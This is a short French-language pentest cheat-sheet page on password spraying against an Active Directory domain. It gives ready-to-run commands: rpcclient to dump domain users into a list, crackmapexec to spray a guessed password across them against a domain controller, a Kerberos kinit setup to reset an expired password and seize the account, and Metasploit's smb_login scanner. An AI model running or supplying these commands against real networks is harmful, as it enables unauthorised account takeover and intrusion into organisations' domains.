# Password Spraying

```bash
rpcclient <IP> -U '<USER>%<PASS>' -c enumdomusers | cut -d[ -f2|cut -d] -f1 > userlist_<IP>.txt
cme smb -u $(pwd)/userlist_<IP>.txt -p <PASSWORD_PROBABLE> -d <domain.local> <DC-IP> --continue-on-success > spray-result_<IP>.txt
```

Si jamais un utilisateur possède un mot de passe correct mais qu'il est expiré, il est possible de mettre à jour ce mot de passe pour pouvoir utilisé le compte :&#x20;

```
#Installer kinit
#Modifier le fichier de configuration /etc/krb5.conf

[libdefaults]
    default_realm = DOMAIN.LOCAL (en MAJ)
[realms]
    DOMAIN.LOCAL = {
        kdc = domain.local
        admin_server = domain.local:88
    }
[domain_realm]
    .domain.local = DOMAIN.LOCAL
    domain.local = DOMAIN.LOCAL
    
# Il peut être nécessaire de renseigné l'IP de DOMAIN.LOCAL dans /etc/hosts
# Changer le mot de passe de USER

kinit <USER>@<DOMAIN.LOCAL>
```

```
msfconsole (scanner/smb/smb_login)
```
